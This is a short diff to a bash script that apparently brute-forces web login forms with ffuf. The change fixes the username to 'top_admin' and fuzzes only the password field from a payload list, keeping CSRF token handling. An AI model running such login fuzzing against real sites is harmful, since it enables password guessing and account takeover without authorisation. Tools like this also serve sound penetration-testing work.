@@ -685,7 +685,7 @@ if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
 fi
 
 # Prepre POST Data
-DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
+DATA="${USERNAME_FIELD}=top_admin&${PASSWORD_FIELD}=FUZZ"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
 # Extract Cookies
@@ -733,21 +733,19 @@ false
 []
 {}
 EOF
-​
+
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL" \
-         -w "$payload_list:FUZZ1" \
-         -w "$payload_list:FUZZ2" \
+         -w "$payload_list:FUZZ" \
          -X GET \
          -ac -c -r \
          -mc 200 \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
-         -w "$payload_list:FUZZ1" \
-         -w "$payload_list:FUZZ2" \
+         -w "$payload_list:FUZZ" \
          -X POST \
          -d "$DATA" \
          -ac -c -r \
